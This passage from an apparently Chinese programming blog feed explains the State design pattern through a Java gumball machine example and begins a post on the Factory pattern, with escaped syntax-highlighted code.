&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 转动曲柄函数
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">turnCrank&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 状态设计模式
&lt;/span>&lt;span style="color:#75715e"> * 已投入硬币,待出售状态
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">HasQuarterState&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> State &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> GumballMachine gumballMachine&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> GumballMachine &lt;span style="color:#a6e22e">getGumballMachine&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> gumballMachine&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">HasQuarterState&lt;/span>&lt;span style="color:#f92672">(&lt;/span>GumballMachine gumballMachine&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">gumballMachine&lt;/span> &lt;span style="color:#f92672">=&lt;/span> gumballMachine&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setGumballMachine&lt;/span>&lt;span style="color:#f92672">(&lt;/span>GumballMachine gumballMachine&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">gumballMachine&lt;/span> &lt;span style="color:#f92672">=&lt;/span> gumballMachine&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">insertQuarter&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;已投币,请先消费。&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">turnCrank&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;发放糖果。。。&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;糖果发放完毕&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
gumballMachine&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setState&lt;/span>&lt;span style="color:#f92672">(&lt;/span>gumballMachine&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getNoQuarterState&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 状态设计模式
&lt;/span>&lt;span style="color:#75715e"> * 等待投入硬币状态
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">NoQuarterState&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> State &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> GumballMachine gumballMachine&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> GumballMachine &lt;span style="color:#a6e22e">getGumballMachine&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> gumballMachine&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">NoQuarterState&lt;/span>&lt;span style="color:#f92672">(&lt;/span>GumballMachine gumballMachine&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">gumballMachine&lt;/span> &lt;span style="color:#f92672">=&lt;/span> gumballMachine&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setGumballMachine&lt;/span>&lt;span style="color:#f92672">(&lt;/span>GumballMachine gumballMachine&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">gumballMachine&lt;/span> &lt;span style="color:#f92672">=&lt;/span> gumballMachine&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">insertQuarter&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;投入硬币成功&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
gumballMachine&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setState&lt;/span>&lt;span style="color:#f92672">(&lt;/span>getGumballMachine&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">getHasQuarterState&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">turnCrank&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;请投入硬币&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 状态设计模式
&lt;/span>&lt;span style="color:#75715e"> * 售罄状态
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SoldOutState&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> State &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> GumballMachine gumballMachine&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> GumballMachine &lt;span style="color:#a6e22e">getGumballMachine&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> gumballMachine&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">SoldOutState&lt;/span>&lt;span style="color:#f92672">(&lt;/span>GumballMachine gumballMachine&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">gumballMachine&lt;/span> &lt;span style="color:#f92672">=&lt;/span> gumballMachine&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setGumballMachine&lt;/span>&lt;span style="color:#f92672">(&lt;/span>GumballMachine gumballMachine&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">gumballMachine&lt;/span> &lt;span style="color:#f92672">=&lt;/span> gumballMachine&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">insertQuarter&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;已售罄&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">turnCrank&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;已售罄&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后利用委托方式将糖果机的任务委托给状态对象使用。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 状态设计模式
&lt;/span>&lt;span style="color:#75715e"> * 糖果机
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">GumballMachine&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 糖果机所对应的所有状态
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> State hasQuarterState&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> State noQuarterState&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> State soldOutState&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 糖果机目前状态
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> State state&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 初始化糖果机状态
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">GumballMachine&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
hasQuarterState &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HasQuarterState&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
noQuarterState &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> NoQuarterState&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
soldOutState &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SoldOutState&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">state&lt;/span> &lt;span style="color:#f92672">=&lt;/span> noQuarterState&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> State &lt;span style="color:#a6e22e">getState&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> state&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setState&lt;/span>&lt;span style="color:#f92672">(&lt;/span>State state&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">state&lt;/span> &lt;span style="color:#f92672">=&lt;/span> state&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> State &lt;span style="color:#a6e22e">getHasQuarterState&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> hasQuarterState&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setHasQuarterState&lt;/span>&lt;span style="color:#f92672">(&lt;/span>State hasQuarterState&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">hasQuarterState&lt;/span> &lt;span style="color:#f92672">=&lt;/span> hasQuarterState&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> State &lt;span style="color:#a6e22e">getNoQuarterState&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> noQuarterState&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setNoQuarterState&lt;/span>&lt;span style="color:#f92672">(&lt;/span>State noQuarterState&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">noQuarterState&lt;/span> &lt;span style="color:#f92672">=&lt;/span> noQuarterState&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> State &lt;span style="color:#a6e22e">getSoldOutState&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> soldOutState&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setSoldOutState&lt;/span>&lt;span style="color:#f92672">(&lt;/span>State soldOutState&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">soldOutState&lt;/span> &lt;span style="color:#f92672">=&lt;/span> soldOutState&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 硬币投入动作函数
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">insertQuarter&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
state&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">insertQuarter&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 转动曲柄函数
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">turnCrank&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
state&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">turnCrank&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
GumballMachine gumballMachine &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> GumballMachine&lt;span style="color:#f92672">();&lt;/span>
gumballMachine&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">turnCrank&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>gumballMachine&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getState&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">getSimpleName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
gumballMachine&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">insertQuarter&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>gumballMachine&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getState&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">getSimpleName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
gumballMachine&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">turnCrank&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>请投入硬币
NoQuarterState
投入硬币成功
HasQuarterState
发放糖果。。。
糖果发放完毕
&lt;/code>&lt;/pre>&lt;p>大功告成。现在的设计不仅能帮你快速解决频繁变更的需求还能减少你和产品经理对话的时间。
这样的代码面向的是接口，而非具体类型编程。它们对扩展开放，对修改关闭。若发生需求变更，你仅仅需要的是增加一个状态对象，在状态对象处理好逻辑，而其他地方的代码你完全不需要改动。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>通过上面的示例，我们可以发现这又是一个利用组合来解决问题的设计模式。很显然组合要比继承更适合于扩展与维护。
在之前的文章中，策略设计模式和状态设计模式非常相似，甚至他们的 uml 图都是一样的。那么为何状态设计模式要单独拿出来讲呢？
这是因为策略设计模式的使用目的在于对象主动地去控制算法或者行为，而状态设计模式更倾向于定义好一组在客户端对象里可以互相转换的状态。&lt;/p></description></item><item><title>工厂设计模式</title><link>https://www.chucklin.net/post/factory_designmode/</link><pubDate>Mon, 01 Jan 2018 16:43:09 +0800</pubDate><guid>https://www.chucklin.net/post/factory_designmode/</guid><description>&lt;h2 id="什么是工厂设计模式">什么是工厂设计模式？&lt;/h2>
&lt;p>工厂设计模式是将拥有共性的产品抽象封装到工厂类中统一进行管理和创建，以达到降低使用者与产品之间的耦合度的目的一种手段。
工厂设计模式是创建者模式之一，且从结构上被划分为三大类。三种不同的结构类型，分别对应处理不同的问题。&lt;/p>
&lt;ul>
&lt;li>简单工厂模式&lt;/li>
&lt;li>工厂方法模式&lt;/li>
&lt;li>抽象工厂模式&lt;/li>
&lt;/ul>
&lt;h2 id="工厂设计模式怎么用">工厂设计模式怎么用？&lt;/h2>
&lt;h3 id="简单工厂模式">简单工厂模式&lt;/h3>
&lt;p>简单工厂模式是最简单，也是最清晰的模式。理解了简单工厂模式，就理解了工厂设计模式的主要思想。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-简单工厂模式
&lt;/span>&lt;span style="color:#75715e"> * 发送接口.
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">interface&lt;/span> &lt;span style="color:#a6e22e">Sender&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">send&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">sendToAll&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-简单工厂模式
&lt;/span>&lt;span style="color:#75715e"> * 工厂类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SenderFactory&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 单例
&lt;/span>&lt;span style="color:#75715e"> * 私有化构造器
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#a6e22e">SenderFactory&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">//Nope
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 嵌套类
&lt;/span>&lt;span style="color:#75715e"> * 持有外部类对象
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SenderFactoryHolder&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> SenderFactory sf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SenderFactory&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 获取单例实例
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @return
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> SenderFactory &lt;span style="color:#a6e22e">getInstanse&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> SenderFactoryHolder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sf&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 根据参数返回相应发送处理类
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @return 邮件/短信发送对象
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Sender &lt;span style="color:#a6e22e">createSender&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String senderType&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">switch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>senderType&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#34;sms&amp;#34;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SMSSender&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#34;mail&amp;#34;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> MailSender&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SMSSender&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-简单工厂模式
&lt;/span>&lt;span style="color:#75715e"> * 短信发送类
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
